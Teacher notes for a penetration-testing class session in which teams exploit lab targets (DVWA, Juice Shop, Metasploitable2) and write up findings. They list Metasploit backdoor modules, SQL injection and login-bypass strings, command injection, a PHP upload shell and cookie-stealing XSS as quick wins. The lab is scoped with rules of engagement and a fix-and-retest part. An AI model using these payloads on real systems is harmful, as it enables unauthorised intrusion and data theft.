# Day 15 — Teacher Notes

**Teach from:** `day15.md` (deck + speaker notes).
**This is a doing day.** You talk for ~20 minutes total (plan + playbook + worked example +
brief) and **circulate for the rest**. Your job is coaching, not lecturing.

**Prep before class:**
- Targets assigned per team on the board — mix DVWA / Juice Shop / Metasploitable2 so teams
  can't just copy each other.
- Metasploit working on every Kali (`msfconsole -q` opens; `db_status` connected is nice but
  not required).
- Have the vsftpd / Samba "easy win" walkthrough ready to hand to any team that stalls.
- Print `assets/one-page-playbook.md` for every student.

---

## The analogy — the real inspection (kitchen)

Days 12–14 were training on each part of the checklist. Today is the actual inspection: full
walkthrough, on the clock, and you **file the report**.

---

## Shape of the session

| Time | What |
|---|---|
| 0:00–0:21 | plan (6) + playbook (7) + one worked example on the projector (8) |
| 0:21–1:03 | **team run** — you circulate; call checkpoints at 15 / 30 / 40 min |
| 1:03–1:15 | **individual write-up** (2-page mini report) |
| 1:15–1:27 | **Week 3 assignment brief** + recap |

If teams are slow: the write-up can start at 40 min for anyone with a proof, and finish as
homework. **Never skip the assignment brief.**

---

## Easy wins by target (hand these to stuck teams)

### Metasploitable2
| Finding | Route to proof |
|---|---|
| vsftpd 2.3.4 backdoor | `use exploit/unix/ftp/vsftpd_234_backdoor` → `set RHOSTS` → `run` → `id` |
| Samba "usermap script" | `use exploit/multi/samba/usermap_script` → `set RHOSTS` → `run` |
| UnrealIRCd 3.2.8.1 backdoor | `use exploit/unix/irc/unreal_ircd_3281_backdoor` |
| distcc | `use exploit/unix/misc/distcc_exec` |
| Tomcat manager (default creds) | `use exploit/multi/http/tomcat_mgr_upload`, creds `tomcat:tomcat` |
| NFS `/` exported | `showmount -e <t>` → `mount` → read files (data-extraction proof) |
| rlogin / rsh trust | `rlogin -l root <t>` |

### DVWA (set security to "low" for the exercise)
| Finding | Route to proof |
|---|---|
| SQLi (SQL Injection page) | `1' OR '1'='1` → dumps users; `1' UNION SELECT user,password FROM users-- -` |
| Login bypass | `admin' -- ` in the username |
| Command injection (page) | `127.0.0.1; id` |
| File upload → shell | upload a PHP one-liner, browse to it |
| Reflected/Stored XSS | `<script>alert(document.cookie)</script>` — proof = the popup / stolen cookie |

### Juice Shop
| Finding | Route to proof |
|---|---|
| SQLi login bypass | email `' OR 1=1--` , any password → logged in as admin |
| Broken access control | change the user id in an API call / basket id |
| Access the admin section | find `/#/administration` |

**A data-extraction or bypass proof is just as valid as a shell** — don't let students think
only a root shell "counts".

---

## Coaching notes (common blockers)

| Symptom | Nudge |
|---|---|
| "the exploit runs but nothing happens" | check `RHOSTS`, `RPORT`; for reverse shells `set LHOST <kali-ip>` (their Kali, not the target); `set PAYLOAD` if the default is wrong |
| "searchsploit finds nothing" | the version might not be the vulnerable one — re-scan; or try a different service |
| team went straight to Metasploit and skipped the scan | send them back to Phase 3 — "what are you even attacking?" |
| team has 4 half-finished attempts | "pick the one closest to working and finish it — one clean finding" |
| team finished in 20 min | second finding, or a data-extraction proof, or help another team |
| exploit crashed the service | that's why we snapshotted — but note it; in a real test that's an ROE stop-condition |
| student wants to try their attack on `<not their target>` | no — assigned target only, same as the ROE |

---

## The write-up — what "good" looks like

A passing 2-page report has: a 3–4 sentence summary a non-technical reader understands; a
service-inventory table; **one** finding with a **captioned screenshot**, **numbered
reproduction steps**, a real impact statement, and a specific fix (not "patch it"); and a
"what next" paragraph. The reproduction steps are the part to push on — "run the exploit" is
not steps; the module name, the options set, and the command that proved it, is.

---

## Week 3 assignment brief — guide

Full spec + checklist: `week3/student-pack.md`. Walk each part ~3 min.

- **Part A (3)** = five Hacksplaining lessons: SQLi, XSS, Command Execution, Directory
  Traversal, Broken Access Control. Completion screenshot + attack / how / fix lines.
- **Part B (4)** = `nmap -sV -sC -oA`, then `nikto` + `nmap --script vuln` on a **fresh
  assigned target**; validate findings (real / false positive); ranked table ≥ 4 (their Day 14
  homework table feeds this).
- **Part C (4)** = prove 3 findings, **≥ 2 from the Hacksplaining five**; captioned screenshot
  + numbered repro steps each.
- **Part D (3)** = fix each, re-run the same test, before/after screenshots, re-run the scan,
  reset the lab. This is the defensive half — don't let it be skipped.
- **Part E (1)** = reflection: easiest vs hardest attack and why.
- *Unmarked stretch:* one CVE explained.
- **One PDF, before Monday. Assigned target only. Snapshot first.**
- Markable in ~5 min from the checklist (15 marks).

### Which Hacksplaining category lives where (assign targets with this in mind)

*Mapping from the lab design — **not yet run end to end**; spot-check before relying on it.*

| Target | Hacksplaining categories students can prove |
|---|---|
| DVWA `10.89.1.20` | SQLi, XSS, Command Execution, Directory Traversal (File Inclusion) |
| Juice Shop `10.89.1.30:3000` | SQLi (login), XSS, Broken Access Control, traversal-style file exposure |
| Metasploitable2 `10.89.1.10` | web apps at `/dvwa` and `/mutillidae` (SQLi, XSS, Command Execution) + vsftpd 2.3.4 for the non-web proof |

### Fix-and-retest cheat sheet (Part D)

*Unverified — confirm each against a running lab before class.*

- **DVWA:** DVWA Security page, `low` → `high`, then repeat the same payload; it should fail.
  (It ships on `low` per the Day 15 notes.)
- **Metasploitable2:** stop or reconfigure the service in the container, re-run `nmap -sV` and the
  proof; the port or the exploit should no longer work.
- **Juice Shop:** no security switch. Accept a written fix (parameterised query, output encoding,
  server-side authorisation check) and re-run the scan to show current state. Mark on whether the
  fix is specific and correct, not on a working patch.
- Reset any target from the student's snapshot afterwards.

---

## Checkpoint (by end of class)

- [ ] every team captured **at least one proof screenshot** with its command
- [ ] every student started (ideally finished) a 2-page mini report
- [ ] everyone has the Week 3 assignment and their **fresh** assigned target
- [ ] the Engagement Journal has Phases 2–4 filled for the practice target

---

## Exit check (verbal, quick)

1. What are the two things a finding needs besides "I found it"? — *evidence and steps to
   reproduce.*
2. You got a shell and a data dump. How many findings is that, for the report? — *One clean
   one is enough — pick the stronger, write it well.*
3. Your weekend target is different from today's. Can you reuse today's exploit? — *Only if
   the scan shows the same vulnerable service — check first; don't assume.*

---

## FAQ

- **"I couldn't exploit anything."** You still write the report — service inventory + ranked
  findings + "here's what I'd exploit and why, I ran out of time". Partial is fine; nothing
  written is not.
- **"Metasploit feels like cheating."** It's a standard professional tool. Part B of the
  assignment is where you prove you understand what it did.
- **"Can I use ChatGPT to help?"** To explain an error or a concept, yes. It can't be on the
  lab network for you, and you must be able to reproduce every step yourself.
- **"What if I break the target for another team?"** Teams have separate targets; if you
  somehow affect a shared service, tell the instructor (ROE stop condition) and we restore it.
